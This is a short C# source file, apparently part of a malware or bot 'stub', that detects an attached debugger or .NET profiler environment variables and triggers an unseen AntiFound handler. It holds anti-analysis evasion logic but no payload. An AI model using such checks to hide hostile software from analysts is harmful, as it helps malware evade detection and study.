//using System;
//using System.Collections.Generic;
//using System.Text;

using System;
using System.Diagnostics;

namespace TwitNetStub.Util.AntiCheck.Anti
{
    internal sealed class CheckDebugger
    {
        public CheckDebugger()
        {
            if (Debugger.IsAttached || Debugger.IsLogging())
                new AntiFound();

            if (Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") != null || 
                Environment.GetEnvironmentVariable("COR_PROFILER") != null)
            {
                new AntiFound();
            }
            //System.GC.Collect();
        }
    }
}